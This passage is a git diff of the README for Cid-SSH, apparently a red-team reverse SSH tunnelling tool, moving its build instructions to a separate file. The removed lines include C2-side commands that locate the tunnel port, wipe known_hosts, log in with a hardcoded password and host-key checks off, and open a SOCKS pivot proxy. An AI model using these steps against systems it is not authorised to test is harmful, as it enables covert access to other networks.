@@ -44,46 +44,9 @@ Restart sshd:
 ```sudo systemctl restart ssh```
 
 ### Prebuilt binaries
-You can just use the prebuilt binaries that are in [Release](https://github.com/RedRangerz/Cid-SSH/releases/tag/v1.0). They are ready to roll.
+You can just use the prebuilt binaries that are in [Release](https://github.com/RedRangerz/Cid-SSH/releases). They are ready to roll.
 
 If you want to compile from source keep reading below.
-
-## Compilation
-
-### Compilation on Windows
-You can use the `CMakeLists.txt` along with `CMake` to create a Visual Studio project.
-
-To easy things installing dependencies you can use `vcpkg`:
-```
-# Install dependencies with vcpkg (static)
-git clone https://github.com/Microsoft/vcpkg.git
-cd vcpkg
-bootstrap-vcpkg.bat
-vcpkg install --triplet x64-windows-static boost-beast boost-asio boost-system libssh[core,openssl]
-
-git submodule update --init --recursive
-# Configure and compile project
-cd Cid-SSH
-cmake -S . -B build_ssh -G "Visual Studio 16 2019" -A x64 -DWITH_WEBSOCKETS=OFF -DCMAKE_TOOLCHAIN_FILE=C:/Users/alberto.garcia/Documents/code/vcpkg/scripts/buildsystems/vcpkg.cmake -DVCPKG_TARGET_TRIPLET=x64-windows-static ..
-cmake --build_ssh . --config Release
-cmake -S . -B build_wss -G "Visual Studio 16 2019" -A x64 -DWITH_WEBSOCKETS=ON -DCMAKE_TOOLCHAIN_FILE=C:/Users/alberto.garcia/Documents/code/vcpkg/scripts/buildsystems/vcpkg.cmake -DVCPKG_TARGET_TRIPLET=x64-windows-static ..
-cmake --build_wss . --config Release
-```
-
-
-### Compilation on Linux
-CidSSH is compiled statically for linux using musl (a replacement for libc) from an Alpine distribution `x86_64`. 
-
-There is a `build.sh` command that can be used to build everything. Just do `sh build.sh` from an Alpine system or docker container.
-```
-sudo docker pull alpine:edge
-sudo docker run --rm -v Cid-SSH:/Cid-SSH --name alpine -t -i alpine:edge /bin/bash
-cd /Cid-SSH
-sh build.sh
-```
-
-### Compilation on MacOs
-There is a `build.sh` command that can be used to build everything. Just do `sh build.sh`
 
 ## Using it
 
@@ -106,11 +69,11 @@ Cid-SSH.exe -t 3232239495
 ```
 Page to do the conversion: http://www.aboutmyip.com/AboutMyXApp/IP2Integer.jsp
 
-In the C2:
-```
-sudo netstat -ptan | grep sshd | grep LISTEN | grep anon
-# Get the port number, replace the XXXXX 
-echo "" > ~/.ssh/known_hosts && sshpass -p pwd ssh user@localhost -p XXXXX -oStrictHostKeyChecking=no -D 0.0.0.0:8888
-# Extra: One-liner for two previous commands:
-echo "" > ~/.ssh/known_hosts && sshpass -p pwd ssh user@localhost -p `sudo netstat -ptan | grep sshd | grep LISTEN | grep anon | cut -d : -f2 | cut -d" " -f1` -oStrictHostKeyChecking=no -D 0.0.0.0:8888
-```
+## Compilation
+
+You can find more info about compilation [here](COMPILATION.md)
+
+## Authors
+- Alberto Garcia Illera (alberto.garcia@getcruise.com)
+- Francisco Oca (foca@getcruise.com)
+- Bert JW Regeer (bert.regeer@getcruise.com)
